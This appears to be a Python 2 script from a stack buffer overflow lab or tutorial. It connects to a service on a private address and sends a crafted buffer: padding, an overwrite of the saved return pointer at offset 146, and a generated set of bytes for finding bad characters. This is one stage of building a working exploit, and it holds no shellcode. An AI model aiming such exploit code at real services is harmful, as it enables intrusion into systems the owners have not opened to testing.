#!/usr/bin/env python2
import socket

RHOST = "172.16.1.54"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

badchar_test = "" # start with an empty string
badchars = [0x00, 0x0A] # we've reasoned that these are definitely bad

# generate the string
for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
    if i not in badchars: # skip the badchars
        badchar_test += chr(i) # append each non-badchar char to the string

# open a file for writing ("w") the string as binary ("b") data
with open("badchar_test.bin", "wb") as f:
    f.write(badchar_test)

buf_totlen = 1024
offset_srp = 146

buf = ""
buf += "A"*(offset_srp - len(buf)) # padding
buf += "BBBB" # SRP overwrite
buf += badchar_test # ESP points here
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send(buf)
